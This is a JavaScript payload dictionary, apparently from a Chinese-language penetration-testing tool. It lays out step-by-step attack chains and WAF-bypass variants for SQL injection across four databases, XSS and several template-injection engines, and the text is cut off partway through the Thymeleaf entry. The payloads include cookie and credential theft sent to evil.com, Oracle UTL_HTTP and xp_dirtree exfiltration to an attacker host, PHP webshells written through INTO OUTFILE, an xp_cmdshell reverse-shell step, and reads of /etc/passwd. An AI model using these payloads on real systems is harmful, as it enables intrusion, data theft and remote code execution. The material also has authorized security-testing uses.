// Payload 字典 — 攻击链场景 + WAF 绕过 + 变换引擎
var StiffEyesPayloads = (function () {

  // ========== 类别定义 ==========
  var CATEGORIES = [
    { id: 'sqli',   label: 'SQL 注入',       icon: '🗄️' },
    { id: 'xss',    label: 'XSS',            icon: '💉' },
    { id: 'ssti',   label: 'SSTI',           icon: '📝' },
    { id: 'ssrf',   label: 'SSRF',           icon: '🌐' },
    { id: 'cmdi',   label: '命令注入',       icon: '💻' },
    { id: 'lfi',    label: '文件包含',       icon: '📂' },
    { id: 'traversal', label: '路径遍历',    icon: '🪜' },
    { id: 'xxe',    label: 'XXE',            icon: '📄' },
    { id: 'jwt',    label: 'JWT',            icon: '🔑' },
    { id: 'upload', label: '文件上传',       icon: '📤' },
    { id: 'deser',  label: '反序列化',       icon: '⚙️' },
    { id: 'log4j',  label: 'Log4j',          icon: '🪵' },
    { id: 'fastjson', label: 'FastJson',      icon: '☕' },
    { id: 'other',   label: '其他',           icon: '📦' }
  ];

  // ========== 攻击链场景 ==========
  var SCENARIOS = [
    // ── SQL 注入 ──
    {
      id: 'sqli-union-01', cat: 'sqli', sub: '联合查询', db: 'mysql',
      title: 'MySQL UNION 注入 — 完整数据提取链',
      steps: [
        { title: '1. 探测注入点', cmd: "'", desc: '闭合前单引号，观察页面报错或行为变化' },
        { title: '2. 验证注入', cmd: "' OR '1'='1' --", desc: '永真条件：正常返回；永假条件：页面异常' },
        { title: '3. 确定列数', cmd: "' ORDER BY 3--", desc: '二分法依次尝试 ORDER BY 1,2,3... 直至报错' },
        { title: '4. 定位回显位', cmd: "' UNION SELECT 1,2,3--", desc: '配合负数 ID 使原查询为空，定位页面回显数字' },
        { title: '5. 获取数据库信息', cmd: "' UNION SELECT 1,database(),user()--", desc: '将 database()/user() 置于回显位' },
        { title: '6. 枚举表名', cmd: "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--", desc: '从 information_schema 枚举库内所有表' },
        { title: '7. 枚举字段', cmd: "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--", desc: '枚举目标表的列名' },
        { title: '8. 拖取凭据', cmd: "' UNION SELECT 1,group_concat(username,':',password),3 FROM users--", desc: '拼接导出敏感字段' }
      ],
      bypass: [
        { technique: '大小写混淆', desc: 'SQL 关键字不区分大小写，随机变换可绕过简单黑名单', cmds: ["' UnIoN SeLeCt 1,2,3--", "' uNiOn sElEcT 1,database(),user()--"] },
        { technique: '内联注释', desc: 'MySQL 特性: /*!...*/ 内语句仍会执行，绕过关键字检测', cmds: ["' /*!UNION*/ /*!SELECT*/ 1,2,3--", "' /*!UNION*/ /*!SELECT*/ 1,database(),user()--"] },
        { technique: '双写绕过', desc: 'WAF 单次替换关键字后，剩余字符重新拼合成关键字', cmds: ["' UNUNIONION SELSELECTECT 1,2,3--", "' UNUNIONION SELSELECTECT 1,database(),user()--"] },
        { technique: '空白符替代', desc: '使用 /**/、%0a、%09 等替代空格绕过基于空格的分词检测', cmds: ["'/**/UNION/**/SELECT/**/1,2,3--", "UNION%0aSELECT%0a1,2,3--"] },
        { technique: '括号绕过', desc: '使用嵌套括号打破正则匹配', cmds: ["UNION(SELECT(1),(2),(3))--", "UNION(SELECT(table_name)FROM(information_schema.tables))--"] }
      ]
    },
    {
      id: 'sqli-blind-01', cat: 'sqli', sub: '盲注', db: 'mysql',
      title: 'MySQL 布尔盲注 — 逐字符猜解链',
      steps: [
        { title: '1. 确认盲注可行', cmd: "' AND 1=1--", desc: '正常返回；1=2 时返回异常，确认布尔注入' },
        { title: '2. 获取库名长度', cmd: "' AND LENGTH(database())=5--", desc: '二分法确定数据库名长度' },
        { title: '3. 逐字符猜解库名', cmd: "' AND ASCII(SUBSTRING(database(),1,1))=109--", desc: '用 ASCII 逐位猜解库名每个字符' },
        { title: '4. 获取表数量', cmd: "' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())=3--", desc: '确定数据库中表的数量' },
        { title: '5. 猜解表名', cmd: "' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100--", desc: '逐行逐字猜解表名' },
        { title: '6. 时间盲注兜底', cmd: "' AND IF(1=1, SLEEP(3), 0)--", desc: '布尔盲注不可行时，改用时间延迟确认结果' }
      ],
      bypass: [
        { technique: '算术替代', desc: '用算术运算替代布尔运算符绕过 AND/OR 检测', cmds: ["' && 1=1--", "' || 1=2--", "' XOR 1=1--"] },
        { technique: '编码混淆', desc: '对敏感字符使用 CHAR() 函数编码', cmds: ["' AND LENGTH(database())=CHAR(53)--", "ASCII(SUBSTRING(database(),1,1))=CHAR(49,48,57)--"] },
        { technique: '大小写 + 注释', desc: '组合多种绕过方法', cmds: ["'/**/AnD/**/1=1--", "'/**/aNd/**/AsCiI(SuBsTrInG(database(),1,1))=109--"] }
      ]
    },
    {
      id: 'sqli-stack-01', cat: 'sqli', sub: '堆叠查询', db: 'mssql',
      title: 'MSSQL 堆叠注入 → xp_cmdshell RCE 链',
      steps: [
        { title: '1. 确认堆叠可行', cmd: "'; SELECT 1;--", desc: '分号后跟查询，确认后端允许多语句执行' },
        { title: '2. 检测数据库版本', cmd: "'; SELECT @@version;--", desc: '确认是否为 MSSQL 及具体版本' },
        { title: '3. 启用 xp_cmdshell', cmd: "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--", desc: '开启高级选项并启用 xp_cmdshell 存储过程' },
        { title: '4. 执行系统命令', cmd: "'; EXEC xp_cmdshell 'whoami';--", desc: '通过 xp_cmdshell 执行任意系统命令' },
        { title: '5. 获取反向 Shell', cmd: "'; EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';--", desc: '用 PowerShell Base64 编码 Payload 反弹 Shell' }
      ],
      bypass: [
        { technique: 'HEX 编码', desc: '将命令转换为十六进制，绕过字符串过滤', cmds: ["'; DECLARE @x AS VARCHAR(100); SET @x=0x77686f616d69; EXEC(@x);--"] },
        { technique: '存储过程替代', desc: '使用 sp_OACreate 等替代 xp_cmdshell', cmds: ["'; EXEC sp_OACreate 'WScript.Shell',@o OUT; EXEC sp_OAMethod @o,'Run',NULL,'cmd /c whoami';--"] }
      ]
    },
    {
      id: 'sqli-auth-01', cat: 'sqli', sub: '认证绕过',
      title: 'SQL 认证绕过 — 多种注入手法链',
      steps: [
        { title: '1. 基础永真', cmd: "admin' OR '1'='1", desc: '在用户名字段注入永真条件' },
        { title: '2. 注释截断', cmd: "admin'--", desc: '注释掉密码校验部分，仅凭用户名登录' },
        { title: '3. 空密码绕过', cmd: "admin' OR 1=1--", desc: 'OR 1=1 绕过所有行检查' },
        { title: '4. 括号闭合', cmd: "admin') OR ('1'='1", desc: '当后端使用括号包裹条件时的注入方式' },
        { title: '5. UNION 欺骗', cmd: "' UNION SELECT 'admin','fake@email.com','password_hash',1,1--", desc: '用 UNION SELECT 伪造合法用户返回' }
      ],
      bypass: [
        { technique: '关键字分词', desc: '在关键字中插入空格/换行打破匹配', cmds: ["admin'/**/OR/**/1=1--", "admin' O/**/R 1=1--"] },
        { technique: '编码绕过', desc: 'URL 编码混淆单引号和操作符', cmds: ["admin%27+OR+1%3D1--", "admin%27%20OR%20%271%27%3D%271"] },
        { technique: '二次 URL 编码', desc: '对已编码字符再次编码', cmds: ["admin%2527+OR+1%253D1--"] }
      ]
    },
    {
      id: 'sqli-my-file-01', cat: 'sqli', sub: '文件读写', db: 'mysql',
      title: 'MySQL 文件读写 → RCE 完整链',
      steps: [
        { title: '1. 检查 file_priv 权限', cmd: "' UNION SELECT 1,CONCAT(user(),0x3a,@@secure_file_priv),3--", desc: '查询当前用户权限及 secure_file_priv 配置' },
        { title: '2. 写入 Webshell', cmd: "' UNION SELECT 1,'<?php system($_GET[\"cmd\"]);?>',3 INTO OUTFILE '/var/www/html/shell.php'--", desc: 'UNION SELECT 配合 INTO OUTFILE 写入 PHP 文件' },
        { title: '3. 确认写入成功', cmd: "' UNION SELECT 1,LOAD_FILE('/var/www/html/shell.php'),3--", desc: '用 LOAD_FILE 读取验证 Webshell 已写入' },
        { title: '4. 触发命令执行', cmd: "GET /shell.php?cmd=id", desc: '访问 Webshell 执行系统命令' },
        { title: '5. 读取系统文件', cmd: "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--", desc: '通过 LOAD_FILE 直接读取任意文件' },
        { title: '6. 权限不足时写日志', cmd: "' UNION SELECT 1,'<?php system($_GET[\"cmd\"]);?>',3 INTO OUTFILE '/var/lib/mysql/shell.php'--", desc: 'secure_file_priv 限定目录内写入' }
      ],
      bypass: [
        { technique: 'HEX 编码写入', desc: '用 0xHEX 编码绕过内容过滤', cmds: ["' UNION SELECT 1,0x3C3F706870...,3 INTO OUTFILE '/var/www/html/shell.php'--"] },
        { technique: '换行符注入', desc: '用 \\n 分隔多条语句', cmds: ["' ; SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/s.php'--"] }
      ]
    },
    {
      id: 'sqli-pg-union-01', cat: 'sqli', sub: '联合查询', db: 'postgresql',
      title: 'PostgreSQL UNION 注入 + 文件读取链',
      steps: [
        { title: '1. 探测注入点', cmd: "'||(SELECT 1)||'", desc: 'PostgreSQL 使用 || 拼接字符串，验证注入' },
        { title: '2. 确定列数', cmd: "' ORDER BY 3--", desc: 'ORDER BY 二分法确定查询列数' },
        { title: '3. 定位回显位', cmd: "' UNION SELECT 1,2,3--", desc: 'UNION SELECT 确定页面回显位置' },
        { title: '4. 获取数据库版本', cmd: "' UNION SELECT 1,version(),current_database()--", desc: '获取 PostgreSQL 版本和当前数据库名' },
        { title: '5. 枚举表名', cmd: "' UNION SELECT 1,string_agg(table_name,','),3 FROM information_schema.tables WHERE table_schema='public'--", desc: '使用 string_agg() 聚合表名 (MySQL group_concat 的 PG 等价)' },
        { title: '6. 读取系统文件', cmd: "' UNION SELECT 1,pg_read_file('/etc/passwd',0,1000),3--", desc: 'pg_read_file() 读取文件内容 (需超级用户权限)' },
        { title: '7. 写入文件 (COPY)', cmd: "'; COPY (SELECT '<?php system($_GET[cmd]);?>') TO '/var/www/html/shell.php';--", desc: '使用 COPY TO 写入 Webshell' }
      ],
      bypass: [
        { technique: 'CHR 编码', desc: '字符串拼接和 CHR() 绕过关键字检测', cmds: ["' UNION SELECT 1,CHR(116)||CHR(97)||CHR(98)||CHR(108)||CHR(101)||CHR(115)--"] },
        { technique: '大小写混淆', desc: 'PostgreSQL 关键字不区分大小写', cmds: ["' uNiOn SeLeCt 1,sTrInG_aGg(tAbLe_NaMe,','),3 FrOm iNfOrMaTiOn_ScHeMa.TaBlEs--"] },
        { technique: '注释注入', desc: 'PostgreSQL 支持嵌套注释', cmds: ["' UN/**/ION SEL/**/ECT 1,pg_read_file('/etc/passwd'),3--"] }
      ]
    },
    {
      id: 'sqli-pg-blind-01', cat: 'sqli', sub: '盲注', db: 'postgresql',
      title: 'PostgreSQL 盲注攻击链',
      steps: [
        { title: '1. 确认盲注', cmd: "' AND 1=1--", desc: '布尔盲注基础确认' },
        { title: '2. 时间盲注', cmd: "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--", desc: 'PostgreSQL 时间盲注: pg_sleep() + CASE WHEN' },
        { title: '3. 提取库名长度', cmd: "' AND (SELECT CASE WHEN LENGTH(current_database())=5 THEN pg_sleep(3) ELSE pg_sleep(0) END)--", desc: '二分法确定数据库名长度' },
        { title: '4. 逐字符猜解库名', cmd: "' AND (SELECT CASE WHEN ASCII(SUBSTR(current_database(),1,1))=112 THEN pg_sleep(2) ELSE pg_sleep(0) END)--", desc: 'ASCII SUBSTR 逐位猜解' },
        { title: '5. 猜解表名', cmd: "' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')>0 THEN pg_sleep(2) ELSE pg_sleep(0) END)--", desc: '判断 public schema 下表数量' },
        { title: '6. 堆叠延时', cmd: ";SELECT PG_SLEEP(5)--", desc: '堆叠查询直接调用 pg_sleep (需多语句支持)' },
        { title: '7. 引号闭合延时', cmd: "');SELECT PG_SLEEP(5)--", desc: '单引号+括号闭合后堆叠 pg_sleep' },
        { title: '8. 数字型延时', cmd: "123')) AND 9831=(SELECT 9831 FROM PG_SLEEP(9))--", desc: '数字型注入 + 双层括号闭合 + pg_sleep 延时' },
        { title: '9. LIKE 布尔盲注', cmd: "12') AND 4799=(SELECT 4799 FROM PG_SLEEP(5)) AND ('kzLS' LIKE 'kzLS", desc: '括号闭合 + pg_sleep + LIKE 末端闭合 (无尾注释符)' },
        { title: '10. 数字型布尔', cmd: '11 OR NOT 7468=7468', desc: '纯数字型布尔盲注 (OR NOT 永假条件)' },
        { title: '11. 数字型延时 + LIKE', cmd: "11') AND 7075=(SELECT 7075 FROM PG_SLEEP(2)) AND ('XVsj' LIKE 'XVsj", desc: '数字型 + 单括号闭合 + pg_sleep + LIKE' }
      ],
      bypass: [
        { technique: '延时函数替代', desc: '使用其他延时函数替代 pg_sleep', cmds: ["' AND (SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM generate_series(1,10000000)) ELSE 0 END)--"] }
      ]
    },
    {
      id: 'sqli-ora-union-01', cat: 'sqli', sub: '联合查询', db: 'oracle',
      title: 'Oracle UNION 注入攻击链',
      steps: [
        { title: '1. 验证注入', cmd: "'||(SELECT 1 FROM dual)||'", desc: 'Oracle 必须 FROM dual；使用 || 拼接验证注入' },
        { title: '2. 确定列数', cmd: "' ORDER BY 3--", desc: 'ORDER BY 二分法确定列数' },
        { title: '3. 确定回显位', cmd: "' UNION SELECT 1,2,3 FROM dual--", desc: 'Oracle UNION SELECT 必须包含 FROM dual' },
        { title: '4. 获取版本信息', cmd: "' UNION SELECT 1,(SELECT banner FROM v$version WHERE ROWNUM=1),3 FROM dual--", desc: '从 v$version 获取数据库版本' },
        { title: '5. 枚举表名', cmd: "' UNION SELECT 1,LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),3 FROM all_tables WHERE owner='SYS'--", desc: 'Oracle 用 all_tables + LISTAGG() 聚合 (需处理 XML 长度限制)' },
        { title: '6. 枚举列名', cmd: "' UNION SELECT 1,column_name,3 FROM all_tab_columns WHERE table_name='USERS' AND ROWNUM<=10--", desc: '从 all_tab_columns 逐列枚举' }
      ],
      bypass: [
        { technique: 'ROWNUM 分页', desc: 'Oracle 无法一次返回多行，用 ROWNUM 逐行查询', cmds: ["' UNION SELECT 1,table_name,3 FROM (SELECT table_name,ROWNUM r FROM all_tables) WHERE r=1--"] },
        { technique: 'XML 聚合', desc: '用 XMLAGG 突破 LISTAGG 长度限制', cmds: ["' UNION SELECT 1,RTRIM(XMLAGG(XMLELEMENT(e,table_name,',').EXTRACT('//text()')).GetClobVal(),','),3 FROM all_tables--"] }
      ]
    },
    {
      id: 'sqli-ora-blind-01', cat: 'sqli', sub: '盲注', db: 'oracle',
      title: 'Oracle 盲注攻击链',
      steps: [
        { title: '1. 布尔盲注', cmd: "' AND 1=1--", desc: '基本布尔确认' },
        { title: '2. Oracle 时间盲注', cmd: "' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM dual)--", desc: 'Oracle 时间盲注使用 DBMS_LOCK.SLEEP() (需 EXECUTE ON DBMS_LOCK 权限)' },
        { title: '3. 解码 SYS 用户', cmd: "' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tables WHERE owner='SYS')>0 THEN DBMS_LOCK.SLEEP(3) ELSE 0 END FROM dual)--", desc: '判断 SYS 用户是否存在目标表' },
        { title: '4. 外带数据 (UTL_HTTP)', cmd: "'||(SELECT UTL_HTTP.REQUEST('http://evil.com/?d='||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual)||'", desc: '通过 UTL_HTTP 将版本信息外带到攻击者服务器' }
      ],
      bypass: [
        { technique: '无 DBMS_LOCK 替代', desc: '当无 DBMS_LOCK 权限时使用大量计算延时', cmds: ["' AND (SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM all_objects,all_objects,all_objects) ELSE 0 END FROM dual)--"] }
      ]
    },
    {
      id: 'sqli-ms-blind-01', cat: 'sqli', sub: '盲注', db: 'mssql',
      title: 'MSSQL 盲注攻击链',
      steps: [
        { title: '1. 布尔盲注', cmd: "' AND 1=1--", desc: '基本布尔确认' },
        { title: '2. 时间盲注 (WAITFOR)', cmd: "'; IF (1=1) WAITFOR DELAY '0:0:5'--", desc: 'MSSQL 时间盲注使用 WAITFOR DELAY，需堆叠查询' },
        { title: '3. 提取库信息', cmd: "'; IF (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0 WAITFOR DELAY '0:0:3'--", desc: 'MSSQL 系统表大写 INFORMATION_SCHEMA' },
        { title: '4. 逐字符猜解', cmd: "'; IF ASCII(SUBSTRING((SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES),1,1))>64 WAITFOR DELAY '0:0:3'--", desc: 'MSSQL 字符串截取用 SUBSTRING 和 TOP' },
        { title: '5. 外带数据', cmd: "'; EXEC xp_dirtree '\\\\ATTACKER_IP\\share\\'--", desc: '通过 SMB 共享外带数据 (DNS 解析也可)' }
      ],
      bypass: [
        { technique: '编码绕过', desc: 'CHAR() 编码绕过关键字检测', cmds: ["'; IF (1=1) WAITFOR DELAY CHAR(48)+CHAR(58)+CHAR(48)+CHAR(58)+CHAR(53)--"] }
      ]
    },

    // ── XSS ──
    {
      id: 'xss-ref-01', cat: 'xss', sub: '基础',
      title: '反射型 XSS → Cookie 窃取完整链',
      steps: [
        { title: '1. 探测注入点', cmd: '<script>alert(1)</script>', desc: '在 URL 参数/表单中注入脚本标签' },
        { title: '2. 确认弹窗', cmd: '<img src=x onerror=alert(document.domain)>', desc: '使用自闭合标签绕过简单过滤' },
        { title: '3. 窃取 Cookie', cmd: '<img src=x onerror=fetch("https://evil.com/?c="+document.cookie)>', desc: '将 Cookie 通过 fetch 外带' },
        { title: '4. 隐藏载荷', cmd: '<img src=x onerror="new Image().src=\'https://evil.com/?c=\'+document.cookie">', desc: '使用 Image 对象静默外带，不触发 CSP 报告' },
        { title: '5. 自动化钓鱼', cmd: "<script>document.body.innerHTML='<h1>Session Expired</h1><form action=https://evil.com/login><input name=user><input type=password name=pass></form>'</script>", desc: '劫持页面渲染自定义登录框，窃取凭证' }
      ],
      bypass: [
        { technique: '大小写混淆', desc: 'HTML 标签/事件名不区分大小写', cmds: ['<ScRiPt>alert(1)</ScRiPt>', '<ImG sRc=x OnErRoR=alert(1)>'] },
        { technique: 'HTML 实体编码', desc: '对敏感字符使用 HTML 实体编码', cmds: ['<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>', '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">'] },
        { technique: '反引号替代', desc: 'JS 中反引号可替代括号用于函数调用', cmds: ['<img src=x onerror=alert`1`>', '<svg/onload=prompt`XSS`>'] },
        { technique: '事件拼接', desc: 'HTML 中实体编码后拼接事件', cmds: ['<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">', '<svg/onload="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">'] }
      ]
    },
    {
      id: 'xss-dom-01', cat: 'xss', sub: 'DOM',
      title: 'DOM XSS 探测与利用链',
      steps: [
        { title: '1. 识别 Source', cmd: '#x', desc: '在 URL hash 后插入测试字符串，检查是否渲染到页面' },
        { title: '2. 确认 Sink', cmd: 'x" onerror=alert(1) x="', desc: '闭合属性注入事件处理，验证 innerHTML/document.write sink' },
        { title: '3. 注入 Payload', cmd: '"><img src=x onerror=alert(document.cookie)>', desc: '闭合当前标签并注入新元素' },
        { title: '4. 利用 eval Sink', cmd: '\'+alert(1)+\'', desc: '当数据直接拼入 eval/setTimeout 时的闭合方式' }
      ],
      bypass: [
        { technique: '模板字面量', desc: '使用 `` 和 ${} 绕过括号检测', cmds: ["';eval`alert\\x281\\x29`;//"] },
        { technique: 'JSFuck 编码', desc: '仅使用 []()!+ 字符构建任意 JS', cmds: ['"><img src=x onerror="([]+[])[(![]+[])[+[]]+...]" >'] }
      ]
    },
    {
      id: 'xss-waf-01', cat: 'xss', sub: '绕过',
      title: 'XSS WAF 多层绕过链',
      steps: [
        { title: '1. 尝试基础标签', cmd: '<svg/onload=alert(1)>', desc: '使用 SVG 标签绕过 <script> 检测' },
        { title: '2. 混合大小写', cmd: '<SvG/oNlOaD=alert(1)>', desc: '大小写混合绕过精确匹配' },
        { title: '3. 空白符混淆', cmd: '<svg / onload = alert(1)>', desc: '在关键字中插入多余空白符' },
        { title: '4. 事件替代', cmd: '<details open ontoggle=alert(1)>', desc: '使用不常见的事件处理 (ontoggle, onanimationend 等)' },
        { title: '5. 编码混淆', cmd: '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>', desc: 'Base64 编码恶意代码，运行时解码执行' }
      ],
      bypass: [
        { technique: 'Polyglot 跨上下文', desc: '一条载荷同时兼容 HTML/JS/CSS 上下文', cmds: ['javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/+/alert(1)//\'>'] },
        { technique: 'import 标签', desc: '利用 import 标签的特性', cmds: ['<html><body><input onfocus=alert(1) autofocus></body></html>'] },
        { technique: 'CSS 注入 XSS', desc: '通过 CSS expression/url 触发', cmds: ['<style>body{background:url(javascript:alert(1))}</style>', '<style>@import"data:,*{color:red}";</style>'] },
        { technique: 'Mutation XSS', desc: '利用浏览器 HTML 解析器的变异行为', cmds: ['<svg><script>alert(1)</script>', '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>'] }
      ]
    },

    // ── SSTI ──
    {
      id: 'ssti-jinja-01', cat: 'ssti', sub: 'Jinja2',
      title: 'Jinja2 SSTI → RCE 完整利用链',
      steps: [
        { title: '1. 探测模板', cmd: '{{7*7}}', desc: '注入数学表达式，返回 49 则确认 Jinja2/Twig 引擎' },
        { title: '2. 获取配置', cmd: '{{config}}', desc: '读取 Flask 应用配置 (SECRET_KEY, DB 连接等)' },
        { title: '3. 获取类对象', cmd: '{{"".__class__.__mro__[2].__subclasses__()}}', desc: '通过空字符串获取 object 的所有子类列表' },
        { title: '4. 定位 subprocess.Popen', cmd: '{{"".__class__.__mro__[2].__subclasses__()[396]}}', desc: '在子类列表中搜索 subprocess.Popen 的索引号' },
        { title: '5. 执行命令', cmd: '{{"".__class__.__mro__[2].__subclasses__()[396]("id",shell=True,stdout=-1).communicate()[0].strip()}}', desc: '调用 Popen 执行任意系统命令' },
        { title: '6. 可控 RCE', cmd: '{{lipsum.__globals__["os"].popen(request.args.cmd).read()}}', desc: '通过 URL 参数动态传入命令' }
      ],
      bypass: [
        { technique: '过滤器绕过', desc: 'Jinja2 沙箱可能过滤了某些魔术方法', cmds: ['{{request|attr("__class__")}}', '{{get_flashed_messages.__globals__.__builtins__.__import__("os").popen("id").read()}}'] },
        { technique: '字符串拼接', desc: '拆分敏感关键字绕过字符串检测', cmds: ['{{"".__class__.__mro__[2].__subclasses__()["__"+"sub"+"classes__"]()}}', '{{cycler.__init__.__globals__.os.popen("id").read()}}'] }
      ]
    },
    {
      id: 'ssti-fm-01', cat: 'ssti', sub: 'FreeMarker',
      title: 'FreeMarker / Velocity SSTI → RCE 链',
      steps: [
        { title: '1. 探测 FreeMarker', cmd: '${7*7}', desc: '返回 49 则确认为 FreeMarker/Velocity 引擎' },
        { title: '2. 获取模板路径', cmd: '${.data_model["com"]["sun"]["org"]["apache"]["xalan"]}', desc: '尝试通过 Java Reflection 访问内部类' },
        { title: '3. 执行命令 (FM)', cmd: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', desc: '实例化 Execute 工具类执行系统命令' },
        { title: '4. 执行命令 (Velocity)', cmd: '#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($ex=$rt.getRuntime().exec("id"))$ex', desc: '通过 Runtime.exec 执行命令' }
      ],
      bypass: [
        { technique: 'API 替代', desc: '使用 ObjectConstructor 替代 Execute', cmds: ['<#assign fo="freemarker.template.utility.ObjectConstructor"?new()>${fo("java.lang.ProcessBuilder","id".split(",")).start()}'] }
      ]
    },

    // ── SSTI 扩展 ──
    {
      id: 'ssti-twig-01', cat: 'ssti', sub: 'Twig',
      title: 'Twig (PHP/Symfony) SSTI → RCE 完整链',
      steps: [
        { title: '1. 探测 Twig', cmd: '{{7*7}}', desc: '返回 49 确认 Twig 引擎 (注意: Jinja2 中 {{7*\'7\'}} 返回 7777777, Twig 返回 49)' },
        { title: '2. 获取环境信息', cmd: '{{_self}}', desc: '查看 Twig 模板自身对象' },
        { title: '3. filter() RCE', cmd: '{{["id"]|filter("system")|join}}', desc: '调用 system 函数执行命令 (Twig 3.x 需 filter 未被移除)' },
        { title: '4. map() RCE', cmd: '{{["id"]|map("system")|join}}', desc: '使用 map 过滤器替代 filter' },
        { title: '5. sort() RCE', cmd: '{{["id",0]|sort("system")|join}}', desc: 'sort 过滤器回调执行系统命令' },
        { title: '6. reduce() RCE', cmd: '{{[0,0]|reduce("system","id")|join}}', desc: 'reduce 回调执行命令' },
        { title: '7. 读取文件', cmd: '{{source("/etc/passwd")}}', desc: 'Twig source() 函数直接读取任意文件' },
        { title: '8. 免引号 RCE', cmd: '{%block U%}id000system{%endblock%}{%set x=block("U")|split("000")%}{{[x|first]|map(x|last)|join}}', desc: '利用 block 标签免引号构造命令' }
      ],
      bypass: [
        { technique: 'registerUndefinedFilter', desc: '利用未注册过滤器回调执行', cmds: ['{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}', '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}'] }
      ]
    },
    {
      id: 'ssti-smarty-01', cat: 'ssti', sub: 'Smarty',
      title: 'Smarty (PHP) SSTI → RCE 完整链',
      steps: [
        { title: '1. 探测 Smarty', cmd: '{$smarty.version}', desc: '返回 Smarty 版本号确认为 Smarty 引擎' },
        { title: '2. 数学表达式', cmd: '{7*7}', desc: '返回 49 确认模板注入' },
        { title: '3. 读取文件', cmd: '{file_get_contents("/etc/passwd")}', desc: '直接调用 PHP 文件读取函数' },
        { title: '4. system RCE', cmd: '{system("id")}', desc: '直接调用 system() 执行命令' },
        { title: '5. passthru RCE', cmd: '{passthru("id")}', desc: 'passthru() 执行命令并直接输出' },
        { title: '6. exec RCE', cmd: '{exec("id")}', desc: 'exec() 执行命令' },
        { title: '7. shell_exec RCE', cmd: '{shell_exec("id")}', desc: 'shell_exec() 执行命令' },
        { title: '8. {php} 标签执行', cmd: '{php}phpinfo();{/php}', desc: '直接执行任意 PHP 代码' },
        { title: '9. 免引号 passthru', cmd: '{passthru(implode(null, array_map(chr(99)|cat:chr(104)|cat:chr(114), [105,100])))}', desc: '用 chr() 拼接字符构造 "chr" 和 [105,100]="id"，免引号' }
      ],
      bypass: [
        { technique: 'Smarty3 安全模式绕过', desc: 'Smarty 3.x 的 SecurityPolicy 绕过', cmds: ['{self::getStreamVariable("file:///etc/passwd")}', '{Smarty_Internal_Write_File::writeFile(["shell.php"], "<?php system(\$_GET[cmd]);?>")}'] }
      ]
    },
    {
      id: 'ssti-erb-01', cat: 'ssti', sub: 'ERB',
      title: 'ERB (Ruby/Rails) SSTI → RCE 完整链',
      steps: [
        { title: '1. 探测 ERB', cmd: '<%= 7*7 %>', desc: '返回 49 确认为 ERB 模板' },
        { title: '2. system 命令执行', cmd: '<%= system("id") %>', desc: 'Ruby Kernel#system 执行系统命令' },
        { title: '3. 反引号命令执行', cmd: '<%= `id` %>', desc: '反引号直接执行 shell 命令并返回输出' },
        { title: '4. IO.popen RCE', cmd: '<%= IO.popen("id").read %>', desc: 'popen 执行命令并读取输出' },
        { title: '5. exec 命令执行', cmd: '<%= exec("id") %>', desc: 'Kernel#exec 替换当前进程执行命令' },
        { title: '6. 文件读取', cmd: '<%= File.open("/etc/passwd").read %>', desc: '直接读取任意文件' },
        { title: '7. Open3 复杂命令', cmd: "<%= require 'open3'; Open3.capture2('id')[0] %>", desc: 'Open3 执行命令并捕获标准输出' },
        { title: '8. %x 字面量', cmd: '<%= %x(id) %>', desc: '%x 是反引号的替代语法' }
      ],
      bypass: [
        { technique: '模板链接', desc: 'ERB 嵌套 render 绕过沙箱', cmds: ['<%= ERB.new("<%= `id` %>").result %>', '<%= render inline: "<%= `id` %>" %>'] }
      ]
    },
    {
      id: 'ssti-spring-01', cat: 'ssti', sub: 'Spring',
      title: 'Thymeleaf/Spring Boot SSTI → RCE 完整链',
      steps: [
        { title: '1. 探测 Thymeleaf', cmd: '__${7*7}__::.x', desc: '返回 __49__::.x 确认为 Thymeleaf 模板' },
        { title: '2. Runtime.exec', cmd: '__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x', desc: '通过 SpEL 调用 Runtime 执行命令 (Spring Boot 3.3.3 前)' },
        { title: '3. ProcessBuilder', cmd: '__${T(java.lang.ProcessBuilder).newInstance(new java.lang.String[]{"bash","-c","id"}).start()}__::.x', desc: 'ProcessBuilder 执行命令替代方案' },
        { title: '4. Spring Boot 3.x 绕过', cmd: '__${"".class.forName("org.apache.commons.lang3.reflect.MethodUtils").invokeMethod("".class.forName("java.lang.Runtime"),"getRuntime").invoke("exec","id")}__::.x', desc: 'Spring Boot 3.3.4+ 通过 Apache Commons MethodUtils 反射绕过' },
        { title: '5. InetAddress 探测', cmd: '__${T(java.net.InetAddress).getByName("DNSLOG.com")}__::.x', desc: 'DNS 外带确认代码执行 (不出网时)' }
      ],
      bypass: [
